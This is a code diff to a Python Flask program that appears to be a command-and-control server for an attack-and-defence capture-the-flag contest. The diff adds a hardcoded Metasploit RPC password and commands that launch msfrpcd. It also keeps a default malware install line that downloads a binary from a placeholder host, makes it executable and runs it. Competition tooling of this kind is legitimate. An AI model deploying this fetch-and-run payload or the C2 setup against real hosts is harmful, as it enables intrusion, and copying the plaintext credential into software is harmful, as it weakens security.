@@ -1,8 +1,11 @@
+#!/usr/bin/env python3
+
 import os
 import random
 import re
 import socket
 import string
+import subprocess
 import time
 from base64 import b64decode
 from datetime import datetime, timedelta
@@ -16,6 +19,7 @@ from flask_sqlalchemy import SQLAlchemy
 # Constants
 PORT = 80
 DEBUG = True
+MSFRPC_PW = "tHVdf97UqDZxmJuh"
 TEMPLATE_DIR = "templates"
 SCRIPTS_DIR = "scripts"
 DB_FILE = "c2.db"
@@ -26,7 +30,7 @@ THREADS = []
 DEFAULT_SUBNET = "172.16.T.B"
 DEFAULT_WHITELISTED_IPS = "127.0.0.1"
 DEFAULT_FLAG_REGEX = "NCX\{[^\{\}]{1,100}\}"
-DEFAULT_MALWARE_PATH = "installer"
+DEFAULT_MALWARE_PATH = "malware_installer"
 DEFAULT_MALWARE_INSTALL = "curl -o installer http://CHANGE_ME/i && chmod +x installer && ./installer"
 DEFAULT_STATUS_PWNED_TIMEOUT = "300"
 DEFAULT_STATUS_FLAGS_TIMEOUT = "300"
@@ -71,6 +75,10 @@ def main():
     add_setting("spam_interval_max", DEFAULT_SPAM_INTERVAL_MAX, "Maximum seconds to wait between each spam")
     add_setting("spam_timeout", DEFAULT_SPAM_TIMEOUT, "Seconds to wait for timeout during spamming")
     add_setting("spam_rand_file", DEFAULT_SPAM_RAND_FILE, "Path to file with random strings line by line")
+
+    # Run MSFRPC
+    subprocess.call("pkill msfrpcd", shell=True)
+    subprocess.call(f"msfrpcd -P {MSFRPC_PW} -S -a 127.0.0.1", shell=True)
 
     # Start threads
     THREADS.append(Thread(target=status, name="status"))
